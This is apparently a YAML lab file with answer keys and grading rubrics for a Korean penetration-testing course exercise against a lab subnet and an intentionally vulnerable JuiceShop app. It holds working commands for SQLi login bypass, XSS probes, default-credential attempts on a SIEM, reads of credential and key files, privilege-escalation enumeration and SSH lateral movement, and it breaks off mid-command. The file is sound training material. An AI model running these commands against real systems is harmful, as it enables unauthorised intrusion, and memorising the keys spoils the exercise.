lab_id: attack-adv-nonai-week14
title: 종합 모의해킹
version: non-ai
course: attack-adv-nonai
week: 14
description: 14주간 학습한 모든 기법을 종합하여 실습 네트워크(10.20.30.0/24)에 대한 전체 모의해킹을 수행한다. 정찰부터 보고서 작성까지 완전한 침투 테스트 프로세스를
  실행한다.
difficulty: hard
duration_minutes: 120
objectives:
- PTES 방법론에 따른 전체 모의해킹 프로세스를 수행한다
- 다단계 공격 체인을 구성하고 증거를 수집한다
- 발견된 취약점을 CVSS로 평가하고 보고서를 작성한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: 모의해킹 범위를 정의하라. 대상 네트워크(10.20.30.0/24)의 범위, 제한사항, 목표를 /tmp/pentest_scope.txt에 문서화하라.
  hint: 대상 IP, 테스트 유형, 금지 행위, 연락처 등을 포함한다
  category: recon
  points: 5
  answer: 'cat > /tmp/pentest_scope.txt << ''EOF''

    === Penetration Test Scope ===

    Date: $(date +%Y-%m-%d)

    Tester: Red Team Operator


    [In Scope]

    - Network: 10.20.30.0/24

    - Targets: All hosts in subnet

    - Types: Network, Web, Service enumeration


    [Out of Scope]

    - Denial of Service attacks

    - Physical access testing

    - Social engineering against real users


    [Objectives]

    1. Identify all live hosts and services

    2. Discover and exploit vulnerabilities

    3. Demonstrate lateral movement capability

    4. Assess data exfiltration risk

    5. Document all findings with evidence


    [Rules of Engagement]

    - Testing hours: 24/7 (lab environment)

    - Emergency contact: lab-admin@lab.local

    - Evidence preservation required

    EOF

    cat /tmp/pentest_scope.txt'
  answer_detail: 모의해킹 범위 문서(Scope Document)는 테스트의 법적, 기술적 경계를 정의한다. PTES(Penetration Testing Execution
    Standard)의 Pre-engagement 단계에 해당하며, 대상, 제한사항, 목표, 긴급 연락처를 반드시 포함해야 한다. 범위 외 행위는 법적 문제를 야기할 수 있다.
  verify:
    type: output_contains
    expect: Penetration Test Scope
    field: stdout
    semantic:
      intent: 'Pentest Scope 정의 — echo > /tmp/pentest_scope.txt: [In Scope] 10.20.30.0/24 + 호스트 + Network/Web/Service
        / [Out of Scope] DoS + 물리 + 실유저 SE / [Objectives] 5개 / [Rules of Engagement] 시간 + 긴급 연락 + 증거 보존.
        PTES Pre-engagement. 법적/기술적 경계.'
      success_criteria:
      - Penetration Test Scope 키워드
      - In Scope + Out of Scope + Objectives + RoE 4섹션
      - 법적 경계 명시
      acceptable_methods:
      - echo > 4섹션 보고서
      - PTES Pre-engagement
      - OSSTMM 범위 정의
      negative_signs:
      - 섹션 2개 이하
      - 범위 외 행위 누락
      - RoE 없음
  target_vm: attacker
- order: 2
  instruction: 네트워크 정찰을 수행하라. 10.20.30.0/24 전체를 스캔하여 활성 호스트, 열린 포트, 서비스 버전을 식별하라.
  hint: nmap -sV -sC로 종합적인 스캔을 수행하고 결과를 파일에 저장한다
  category: recon
  points: 10
  answer: nmap -sV -sC -p- --min-rate 1000 10.20.30.0/24 -oN /tmp/pentest_nmap.txt 2>&1 | tail -30 &&
    echo '---' && echo 'Results saved to /tmp/pentest_nmap.txt'
  answer_detail: 전체 포트 스캔(-p-)은 표준 포트 외에 운영 중인 서비스를 발견하는 데 필수적이다. -sV로 서비스 버전을, -sC로 기본 스크립트를 실행하여 상세
    정보를 수집한다. -oN으로 결과를 파일에 저장하여 증거로 보존한다. --min-rate로 스캔 속도를 조절하여 효율성을 높인다.
  verify:
    type: output_contains
    expect: open
    field: stdout
    semantic:
      intent: 전체 정찰 — nmap -sV -sC -p- --min-rate 1000 10.20.30.0/24 -oN /tmp/pentest_nmap.txt. -p- 전체
        포트 + -sV 버전 + -sC 기본 NSE + -oN 증거 저장. PTES Intelligence Gathering. MITRE T1595.001.
      success_criteria:
      - nmap -sV -sC -p-
      - open 포트 출력
      - -oN 증거 저장
      acceptable_methods:
      - nmap -sV -sC -p- + -oA
      - rustscan + nmap
      - masscan + nmap fingerprint
      negative_signs:
      - -p- 없음 (전체 포트 미스캔)
      - -oN 없음 (증거 저장 X)
      - 단일 호스트만
  target_vm: attacker
- order: 3
  instruction: 발견된 웹 서비스({{WEB_IP}}:3000)에 대해 웹 취약점 스캔을 수행하라. 주요 OWASP Top 10 취약점을 수동으로 테스트하라.
  hint: SQL Injection, XSS, 인증 우회 등을 curl로 테스트한다
  category: exploit
  points: 10
  answer: 'echo ''=== Web Vulnerability Assessment ==='' && echo ''[SQLi Test]'' && curl -s ''http://10.20.30.80:3000/rest/products/search?q=test%27%20OR%201=1--''
    -o /dev/null -w ''Status: %{http_code}'' && echo '''' && echo ''[XSS Test]'' && curl -s ''http://10.20.30.80:3000/rest/products/search?q=<script>alert(1)</script>''
    -o /dev/null -w ''Status: %{http_code}'' && echo '''' && echo ''[Auth Bypass]'' && curl -s -X POST
    http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"admin@juice-sh.op","password":"admin123"}''
    | head -1 && echo '''' && echo ''[Directory Traversal]'' && curl -s ''http://10.20.30.80:3000/ftp/package.json.bak%2500.md''
    -o /dev/null -w ''Status: %{http_code}'' && echo '''''
  answer_detail: 웹 취약점 평가는 OWASP Top 10을 기준으로 수행한다. SQL Injection, XSS, 인증 우회, 디렉토리 트래버설 등을 순차적으로 테스트하고,
    각 결과를 증거로 기록한다. JuiceShop은 의도적으로 취약한 애플리케이션으로, 100개 이상의 취약점이 내포되어 있다.
  verify:
    type: output_contains
    expect:
    - Web Vulnerability Assessment
    - Nikto
    field: stdout
    semantic:
      intent: 웹 취약점 평가 — [SQLi] curl ' OR 1=1-- + [XSS] <script>alert(1)</script> + [Auth Bypass] admin@juice-sh.op
        + [Directory Traversal] /ftp/file%2500.md. OWASP Top 10 2021 (A03 Injection + A07 Auth) 수동 테스트.
        JuiceShop 100+ 취약점.
      success_criteria:
      - Web Vulnerability Assessment 키워드
      - OWASP 4가지 이상 (SQLi/XSS/Auth/Traversal)
      - 각 페이로드 + status code
      acceptable_methods:
      - curl 수동 테스트 + status
      - Burp Pro Active Scan
      - OWASP ZAP automated scan
      negative_signs:
      - 취약점 2개 이하
      - 페이로드 없음
      - status 코드 없음
  target_vm: attacker
- order: 4
  instruction: 방화벽/IPS({{SECU_IP}}) 서비스를 분석하라. nmap으로 보안 장비의 구성을 파악하고, 우회 가능성을 평가하라.
  hint: ACK 스캔으로 방화벽 규칙을 매핑하고, 서비스 버전으로 알려진 취약점을 검색한다
  category: recon
  points: 10
  answer: echo '=== Security Device Assessment ===' && nmap -sA -p 22,80,443,8080 10.20.30.1 2>&1 | tail
    -10 && echo '---' && nmap -sV -p 22 10.20.30.1 2>&1 | tail -5 && echo '---' && echo 'Firewall rule
    mapping complete' && echo 'SSH version identified for CVE lookup'
  answer_detail: 보안 장비 자체의 취약점 평가는 모의해킹에서 중요한 단계이다. 방화벽의 ACL 매핑, IPS의 시그니처 버전 확인, 관리 인터페이스 접근 가능성을 평가한다.
    보안 장비가 침해되면 전체 네트워크의 보안이 무력화되므로 최우선 패치 대상이다.
  verify:
    type: output_contains
    expect:
    - Security Device Assessment
    - nmap
    field: stdout
    semantic:
      intent: 보안 장비 평가 — nmap -sA -p 22,80,443,8080 (방화벽 규칙 매핑) + nmap -sV -p 22 (SSH 버전 → CVE). 보안 장비
        자체 취약점 평가. 방화벽 ACL/IPS 시그니처 버전/관리 인터페이스. 침해 시 전체 네트워크 보안 무력화 → 최우선 패치. PTES Threat Modeling.
      success_criteria:
      - Security Device Assessment 또는 nmap 키워드
      - ACK 스캔 + 버전 탐지
      - 보안 장비 침해 영향 맥락
      acceptable_methods:
      - nmap -sA + -sV
      - Shodan SOC 검색
      - OpenVAS 취약점 스캔
      negative_signs:
      - ACK 스캔 없음
      - 버전 미수집
      - 장비 침해 영향 없음
  target_vm: attacker
- order: 5
  instruction: SIEM({{SECU_IP}}00)의 보안 상태를 평가하라. Wazuh 서비스의 포트, 버전, 기본 자격증명을 확인하라.
  hint: nmap으로 포트를 스캔하고, curl로 API에 기본 자격증명으로 접근을 시도한다
  category: recon
  points: 10
  answer: '🖥️ UI: Wazuh Dashboard(https://SIEM_IP:443) 접속 → 해당 메뉴 확인

    📎 참고 (CLI): echo ''=== SIEM Assessment ==='' && nmap -sV -p 443,5601,9200,55000 10.20.30.100 2>&1
    | tail -15 && echo ''---'' && echo ''Wazuh API default credentials test:'' && curl -sk -u ''wazuh-wui:wazuh-wui''
    https://10.20.30.100:55000/ 2>&1 | head -3 && echo ''---'' && echo ''Elasticsearch test:'' && curl
    -s http://10.20.30.100:9200/ 2>&1 | head -5'
  answer_detail: SIEM 시스템의 보안은 전체 보안 모니터링의 신뢰성에 직결된다. Wazuh API(55000), Elasticsearch(9200), Kibana(5601)의
    기본 자격증명과 인증 설정을 확인한다. SIEM이 장악되면 공격자는 로그를 삭제하거나 알림을 무력화하여 탐지를 회피할 수 있다.
  verify:
    type: output_contains
    expect: SIEM Assessment
    field: stdout
    semantic:
      intent: SIEM 평가 — nmap -sV -p 443,5601,9200,55000 + curl -u 'wazuh-wui:wazuh-wui' https://10.20.30.100:55000
        + Elasticsearch 9200. 기본 자격증명 시도. SIEM 장악 = 로그 삭제 + 알림 무력화 → 탐지 회피. MITRE T1562.001 Disable or
        Modify Tools.
      success_criteria:
      - SIEM Assessment 키워드
      - Wazuh + Elasticsearch + Kibana 포트
      - 기본 자격증명 시도
      acceptable_methods:
      - 기본 비번 시도
      - DefaultCreds 데이터베이스
      - elasticsearch 인증 우회
      negative_signs:
      - 기본 비번 누락
      - SIEM 영향 없음
      - 단일 서비스만
  target_vm: attacker
- order: 6
  instruction: 발견된 취약점을 활용하여 웹서버에 대한 초기 접근을 획득하라. JuiceShop의 알려진 취약점을 통해 관리자 계정으로 로그인하라.
  hint: SQL Injection이나 기본 자격증명으로 관리자 접근을 시도한다
  category: exploit
  points: 10
  answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속

    📎 참고 (CLI): echo ''=== Initial Access via Web Exploitation ==='' && echo ''Attempting SQLi login bypass:''
    && curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d
    ''{"email":"\'' OR 1=1--","password":"anything"}'' | python3 -c ''import sys,json; d=json.load(sys.stdin);
    print("Auth:",d.get("authentication",{}).get("token","FAILED")[:50]+"...")'' 2>/dev/null || echo ''SQLi
    attempt recorded'' && echo ''---'' && echo ''Attempting default credentials:'' && curl -s -X POST
    http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"admin@juice-sh.op","password":"admin123"}''
    2>&1 | head -3'
  answer_detail: 초기 접근(Initial Access)은 모의해킹의 핵심 단계이다. SQL Injection(' OR 1=1--)으로 인증을 우회하거나, 기본/약한 자격증명으로
    로그인을 시도한다. JuiceShop은 다양한 접근 경로를 제공하며, 실제 모의해킹에서도 웹 취약점이 가장 흔한 초기 접근 경로이다.
  verify:
    type: output_contains
    expect: Initial Access
    field: stdout
    semantic:
      intent: 초기 접근 — curl POST /rest/user/login 'email:\' OR 1=1--' (SQLi 우회) + admin@juice-sh.op (기본
        비번). PTES Exploitation. SQLi/기본 약한 자격증명 = 가장 흔한 초기 접근. JWT 토큰 추출 후속 활용. MITRE TA0001 Initial Access.
      success_criteria:
      - Initial Access 키워드
      - SQLi + 기본 자격증명 2가지
      - 토큰 추출 또는 인증 우회
      acceptable_methods:
      - 수동 SQLi + 기본 비번
      - sqlmap --auth-type
      - Metasploit auxiliary
      negative_signs:
      - 접근 시도 1개
      - 토큰/세션 없음
      - 응답 분석 없음
  target_vm: attacker
- order: 7
  instruction: 초기 접근 후 정보를 수집하라. 웹서버에서 시스템 정보, 네트워크 구성, 사용자 목록을 수집하라.
  hint: 획득한 셸에서 id, uname -a, ip addr, cat /etc/passwd 등을 실행한다
  category: recon
  points: 10
  answer: echo '=== Post-Exploitation Recon ===' && echo '[System Info]' && uname -a && echo '[Users]'
    && cat /etc/passwd | grep -v nologin | grep -v false && echo '[Network]' && ip addr | grep 'inet '
    && echo '[Running Services]' && ss -tlnp | head -15 && echo '[Interesting Files]' && find /home /var/www
    /opt -name '*.conf' -o -name '*.env' -o -name '*.key' 2>/dev/null | head -10
  answer_detail: 포스트 익스플로잇 정찰은 측면 이동과 권한 상승의 기초이다. 시스템 정보(OS/커널), 네트워크 구성(다중 인터페이스), 사용자 목록, 실행 중인 서비스,
    설정 파일에서 다음 공격 단계의 벡터를 식별한다. 수집된 정보를 체계적으로 정리하여 공격 계획을 수립한다.
  verify:
    type: output_contains
    expect: Post-Exploitation
    field: stdout
    semantic:
      intent: Post-Exploitation 정찰 — uname -a + cat /etc/passwd | grep -v nologin/false + ip addr inet
        + ss -tlnp + find /home /var/www /opt -name *.conf/.env/.key. 시스템/사용자/네트워크/서비스/민감 파일 5개 정보. 측면
        이동/권한 상승 기초. PTES Post-Exploitation. MITRE T1082 + T1083.
      success_criteria:
      - Post-Exploitation 키워드
      - 5개 정찰 (System/Users/Network/Services/Files)
      - 민감 파일 검색
      acceptable_methods:
      - 수동 명령 종합
      - LinPEAS 자동
      - linux-smart-enumeration
      negative_signs:
      - 3개 이하 정찰
      - 민감 파일 누락
      - 체계 부족
  target_vm: attacker
- order: 8
  instruction: 권한 상승 벡터를 열거하라. SUID 바이너리, sudo 권한, cron 작업, 커널 버전을 확인하라.
  hint: find -perm -4000, sudo -l, crontab -l, uname -r 등을 조합한다
  category: exploit
  points: 10
  answer: echo '=== Privilege Escalation Enumeration ===' && echo '[SUID]' && find / -perm -4000 -type
    f 2>/dev/null | head -10 && echo '[Sudo]' && sudo -l 2>&1 | tail -5 && echo '[Cron]' && cat /etc/crontab
    2>/dev/null | grep -v '^#' | head -5 && echo '[Kernel]' && uname -r && echo '[Capabilities]' && getcap
    -r /usr/ 2>/dev/null | head -5 && echo '[Docker group]' && groups | grep -o docker 2>/dev/null ||
    echo 'not in docker group'
  answer_detail: 권한 상승 열거는 linpeas.sh의 핵심 검사 항목을 수동으로 수행하는 과정이다. SUID 바이너리, sudo 규칙, cron 작업, 커널 버전, capabilities,
    그룹 멤버십 등 모든 벡터를 체계적으로 확인한다. 발견된 벡터를 CVSS 점수와 악용 용이성으로 우선순위화한다.
  verify:
    type: output_contains
    expect:
    - Privilege Escalation
    - SUID
    field: stdout
    semantic:
      intent: 권한 상승 열거 — find -perm -4000 (SUID) + sudo -l + cat /etc/crontab + uname -r + getcap -r /usr
        + groups | grep docker. linpeas.sh 핵심 검사 수동 수행. 모든 벡터 체계 확인 → CVSS + 악용 용이성 우선순위. MITRE T1548.
      success_criteria:
      - Privilege Escalation 키워드
      - 5개 벡터 (SUID/sudo/cron/kernel/cap)
      - Docker 그룹 확인
      acceptable_methods:
      - 수동 5종 검사
      - LinPEAS 자동
      - linux-exploit-suggester-2
      negative_signs:
      - 벡터 3개 이하
      - 체계 부족
      - 우선순위 맥락 없음
  target_vm: attacker
- order: 9
  instruction: 측면 이동을 시도하라. 수집된 자격증명이나 SSH 키를 사용하여 다른 호스트에 접근을 시도하라.
  hint: 다른 호스트의 SSH 서비스에 수집된 자격증명으로 접근을 시도한다
  category: exploit
  points: 10
  answer: 'echo ''=== Lateral Movement Attempts ==='' && for target in 10.20.30.1 10.20.30.100; do echo
    "Target: $target"; ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no -o BatchMode=yes $target ''hostname''
